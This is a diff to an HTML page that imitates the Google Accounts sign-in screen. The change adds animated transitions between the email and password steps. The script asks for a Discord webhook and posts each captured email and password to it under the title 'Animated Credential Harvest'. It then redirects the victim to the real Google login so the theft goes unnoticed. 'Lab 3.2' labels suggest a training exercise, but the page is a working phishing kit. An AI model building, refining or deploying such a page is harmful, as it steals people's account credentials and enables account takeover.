@@ -4,53 +4,82 @@
     <meta charset="UTF-8">
     <title>Sign in - Google Accounts</title>
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { width: 350px; min-height: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
-        img { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        body { font-family: 'Roboto', arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { position: relative; width: 450px; height: 500px; background: #fff; border: 1px solid #dadce0; border-radius: 8px; overflow: hidden; display: flex; flex-direction: column; align-items: center; padding: 48px 40px 36px; box-sizing: border-box; }
+        
+        /* The "Stage" for animations */
+        .stage { position: relative; width: 100%; height: 100%; transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        .card { width: 100%; position: absolute; top: 0; left: 0; transition: opacity 0.2s, transform 0.3s; text-align: center; }
+        
+        /* State Handling */
+        .hidden { opacity: 0; pointer-events: none; transform: translateX(100px); }
+        .exit { opacity: 0; pointer-events: none; transform: translateX(-100px); }
+
+        img { width: 75px; margin-bottom: 8px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px; }
         p { color: #202124; font-size: 16px; margin-bottom: 24px; }
-        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; transition: border 0.2s; }
         input:focus { outline: none; border: 2px solid #1a73e8; }
-        button { width: 88px; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; float: right; margin-top: 30px; }
-        .hidden { display: none; }
-        .user-display { border: 1px solid #dadce0; border-radius: 16px; padding: 5px 15px; display: inline-flex; align-items: center; margin-bottom: 20px; font-size: 14px; }
-        .footer { position: absolute; bottom: 40px; left: 40px; text-align: left; font-size: 14px; color: #1a73e8; font-weight: 500; cursor: pointer; }
+        
+        .user-pill { display: inline-flex; align-items: center; padding: 5px 12px; border: 1px solid #dadce0; border-radius: 16px; font-size: 14px; margin-bottom: 20px; cursor: pointer; }
+        .btn-row { width: 100%; margin-top: 40px; display: flex; justify-content: space-between; align-items: center; }
+        .link { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; text-decoration: none; }
+        button { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
     </style>
 </head>
 <body>
 
-<div class="card" id="email-stage">
+<div class="container">
     <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-    <h1>Sign in</h1>
-    <p>Use your Google Account</p>
-    <input type="email" id="email" placeholder="Email or phone" autofocus>
-    <div style="text-align: left; color: #1a73e8; font-size: 14px; font-weight: 500; margin-top: 5px; cursor: pointer;">Forgot email?</div>
-    <div class="footer">Create account</div>
-    <button onclick="nextStep()">Next</button>
-</div>
+    
+    <!-- Step 1: Email -->
+    <div class="card" id="step-email">
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        <input type="email" id="email" placeholder="Email or phone" autofocus>
+        <div style="text-align: left;"><a href="#" class="link">Forgot email?</a></div>
+        <div class="btn-row">
+            <a href="#" class="link">Create account</a>
+            <button onclick="toPassword()">Next</button>
+        </div>
+    </div>
 
-<div class="card hidden" id="password-stage">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-    <h1>Welcome</h1>
-    <div class="user-display" id="display-email"></div>
-    <input type="password" id="pass" placeholder="Enter your password" autofocus>
-    <div style="text-align: left; color: #1a73e8; font-size: 14px; font-weight: 500; margin-top: 5px; cursor: pointer;">Forgot password?</div>
-    <button onclick="transmit()">Next</button>
+    <!-- Step 2: Password -->
+    <div class="card hidden" id="step-password">
+        <h1>Welcome</h1>
+        <div class="user-pill" id="user-display" onclick="reset()"></div>
+        <input type="password" id="pass" placeholder="Enter your password" autofocus>
+        <div style="text-align: left;"><a href="#" class="link">Forgot password?</a></div>
+        <div class="btn-row">
+            <span></span> <!-- Spacer -->
+            <button onclick="transmit()">Next</button>
+        </div>
+    </div>
 </div>
 
 <script>
     let hook = sessionStorage.getItem('discord_hook');
     if (!hook) {
-        hook = prompt("ENTER DISCORD WEBHOOK:");
+        hook = prompt("Enter Discord Webhook for Lab 3.2:");
         if (hook) sessionStorage.setItem('discord_hook', hook);
     }
 
-    function nextStep() {
+    function toPassword() {
         const email = document.getElementById('email').value;
-        if(!email) return;
-        document.getElementById('display-email').innerText = email;
-        document.getElementById('email-stage').classList.add('hidden');
-        document.getElementById('password-stage').classList.remove('hidden');
+        if (!email) return;
+
+        document.getElementById('user-display').innerText = email;
+        
+        // Trigger Animation
+        document.getElementById('step-email').classList.add('exit');
+        setTimeout(() => {
+            document.getElementById('step-password').classList.remove('hidden');
+        }, 150);
+    }
+
+    function reset() {
+        document.getElementById('step-password').classList.add('hidden');
+        document.getElementById('step-email').classList.remove('exit');
     }
 
     async function transmit() {
@@ -59,26 +88,21 @@
 
         const payload = {
             embeds: [{
-                title: "🎯 Lab 3.2 Target Captured",
-                color: 16711680,
+                title: "🔑 Animated Credential Harvest",
+                color: 3447003,
                 fields: [
-                    { name: "User", value: `\`${e}\`` },
-                    { name: "Password", value: `|| ${p} ||` }
+                    { name: "Email", value: `\`${e}\``, inline: true },
+                    { name: "Pass", value: `|| ${p} ||`, inline: true }
                 ],
-                footer: { text: "Protocol: Indirect Injection Simulation" }
+                footer: { text: "Ref: LAB_EXERCISES_60.txt" }
             }]
         };
 
         try {
-            await fetch(hook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            // Redirect to actual Google to close the loop
-            window.location.href = "https://accounts.google.com/ServiceLogin";
+            await fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            window.location.href = "https://accounts.google.com/v3/signin/identifier";
         } catch {
-            window.location.href = "https://accounts.google.com/ServiceLogin";
+            window.location.href = "https://accounts.google.com/v3/signin/identifier";
         }
     }
 </script>
